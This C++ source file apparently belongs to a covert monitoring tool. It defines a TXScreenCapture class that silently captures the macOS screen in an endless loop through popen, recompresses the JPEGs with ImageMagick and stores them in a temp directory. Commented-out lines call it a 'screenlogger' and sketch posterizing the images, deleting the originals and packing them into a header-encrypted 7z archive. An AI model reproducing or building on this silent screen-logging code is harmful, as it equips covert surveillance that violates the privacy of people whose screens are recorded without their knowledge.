#include <thread>
#include <iostream>
#include "TXScreenCapture.h"
#include "TXConfig.h"

void TXScreenCapture::operator()() {
    TXLogger *logger = TXLogger::instance();
    //    logger->writeln("[[S] SCREENLOGGER INITIALIZED]");

    FILE *sc;

    while (true) {
        std::string c1 = "screencapture -C -t jpg -T 0 -x -r  " + logger->getTemDir() + "screen.jpg;";
        c1 += logger->getImagickBinDir() + "convert -format jpg -quality 30 " + logger->getTemDir() + "screen.jpg " + logger->getTemDir() + "screen.jpg;";
//        c1 += logger->getImagickBinDir() + "convert -colors 256 -depth 8 -posterize 6 " + logger->getTemDir() + "screen.jpg " + logger->getTemDir() + "screen.jpg;";
//        c1 += logger->getImagickBinDir() + "convert -colors 256 -depth 8 -posterize 6 " + logger->getTemDir() + "screen.jpg " + logger->getTemDir() + "screen.bmp;";
//        c1 += "rm " + logger->getTemDir() + "screen.jpg;";
//        c1 += "7za a -t7z " + logger->getTemDir() + "screen.7z -m0=lzma2 -mx=9 -aoa -mfb=64 -md=32m -ms=on -mhe " + logger->getTemDir() + "screen.bmp;";
//        c1 += "rm " + logger->getTemDir() + "screen.bmp;";

        sc = popen(c1.c_str(), "r");
        pclose(sc);

        this->wait();
    }
}

void TXScreenCapture::wait() {
    std::cout << " wait " << std::endl;
    std::this_thread::sleep_for(std::chrono::milliseconds(TRIX_SCREENCAPTURE_INTERVAL));
}

